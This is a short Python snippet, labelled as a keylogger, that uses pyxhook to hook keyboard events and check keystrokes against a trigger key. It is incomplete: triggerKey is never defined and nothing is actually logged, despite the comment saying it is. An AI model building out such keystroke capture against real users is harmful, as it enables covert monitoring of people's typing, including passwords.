import pyxhook as ph
# logs users key strokes waiting for trigger input

#Keylogger(pyxhook)
def OnKeyPress(event):
    #global keyword modifies the global varibles
    global triggerKey

    if event.Key == triggerKey:
        return True

hm = ph.HookManager()
hm.KeyDown = OnKeyPress
hm.HookKeyboard()
hm.start()
































